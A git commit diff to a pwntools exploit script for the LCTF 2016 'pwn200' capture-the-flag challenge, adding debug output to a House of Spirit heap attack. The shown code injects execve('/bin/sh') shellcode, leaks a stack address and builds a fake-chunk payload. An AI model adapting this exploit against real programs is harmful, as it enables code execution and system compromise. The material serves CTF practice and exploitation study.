410e9e032ca50d7c38957ae0a14d43781e3c0f74
M4xW4n9 <aboultraman@gmail.com>
2018-05-22 18:50:16 +0800

    house of spirit

--- lctf2016_pwn200/hos.py
+++ lctf2016_pwn200/hos.py
@@ -12,13 +12,16 @@ def DEBUG():
 
 io = process("./pwn200")
 
+#  DEBUG()
 # who are u?
 sc = asm(shellcraft.execve("/bin/sh"))
 io.sendafter("?\n", sc.ljust(48, '0'))
 rbpAddr = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\x00'))
 success("rbpAddr -> {:#x}".format(rbpAddr))
 scAddr = rbpAddr - 0x50
+success("scAddr -> {:#x}".format(scAddr))
 fakeChunk = rbpAddr - 0x90
+success("fakeChunk -> {:#x}".format(fakeChunk))
 
 # give me your id
 io.sendlineafter("?\n", str(0x20)) # id
@@ -26,6 +29,7 @@ io.sendlineafter("?\n", str(0x20)) # id
 # give me money
 payload = p64(0) * 5 + p64(0x41)
 payload = payload.ljust(0x40 - 8, '\x00') + p64(fakeChunk)
+DEBUG()
 io.sendlineafter("~\n", payload)
 
 # free
